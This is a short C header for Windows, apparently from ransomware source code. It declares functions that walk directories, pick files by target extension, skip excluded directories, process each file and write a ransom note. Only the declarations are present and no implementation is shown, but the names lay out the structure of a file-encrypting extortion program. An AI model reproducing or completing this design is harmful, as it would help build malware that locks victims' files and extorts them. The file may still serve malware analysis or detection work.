#ifndef FILES_H
#define FILES_H

#include <windows.h>

void walk_directory(const char *root);
BOOL process_file(const char *full_path);
BOOL is_target_ext(const char *name);
BOOL is_excluded_dir(const char *name);
BOOL is_excluded(const char *name);
void write_ransom_note(const char *dir);

#endif